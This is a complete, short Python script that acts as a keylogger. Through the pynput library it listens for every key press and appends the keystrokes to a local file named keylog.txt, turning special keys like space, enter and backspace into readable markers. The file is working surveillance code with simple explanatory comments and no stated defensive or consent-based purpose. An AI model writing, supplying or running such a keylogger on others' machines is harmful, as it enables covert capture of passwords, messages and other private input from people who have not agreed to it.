from pynput.keyboard import Listener

# This file will store all the logged keystrokes
log_file = "keylog.txt"

# Function to write the keystrokes into the file
def write_to_file(key):
    with open(log_file, 'a') as f:
        key = str(key).replace("'", "")  # Format key by removing extra characters
        
        # Replace special keys with more readable names
        if key == 'Key.space':
            f.write(' ')  # Log space as a space character
        elif key == 'Key.enter':
            f.write('\n')  # Log enter as a new line
        elif key == 'Key.backspace':
            f.write('[BACKSPACE]')  # Log backspace as [BACKSPACE]
        elif key == 'Key.shift':
            f.write('[SHIFT]')  # Log shift as [SHIFT]
        elif key == 'Key.esc':
            f.write('[ESC]')  # Log escape as [ESC]
        else:
            f.write(key)  # Log regular key presses as they are

# Function to handle key press events
def on_press(key):
    write_to_file(key)  # Call the function to log the key press

# Start listening for keystrokes
with Listener(on_press=on_press) as listener:
    listener.join()
